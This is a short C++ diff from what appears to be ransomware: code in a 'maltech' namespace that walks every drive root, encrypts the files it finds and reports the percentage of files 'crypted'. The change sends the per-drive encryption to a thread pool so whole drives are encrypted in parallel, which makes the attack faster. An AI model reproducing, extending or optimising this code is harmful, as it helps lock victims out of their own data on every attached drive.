@@ -35,13 +35,16 @@ namespace maltech {
                     path += disk;
                     path += ":\\*";
                     try {
-                        ProcessCatalogue(path);
+                        thread_pool_.AddTask([path, self = shared_from_this()]() {
+                            self->ProcessCatalogue(path);
+                            });
                     }
                     catch (const std::exception& e) {
                         LOG_ERROR("Encrypting error: "s + e.what());
                     }
                 }
             }
+            thread_pool_.WaitAllTasks();
             double crypted_persentege = (crypted_count_.load() * 100.0 / files_count_.load());
             std::ostringstream strm;
             strm << std::setprecision(2)
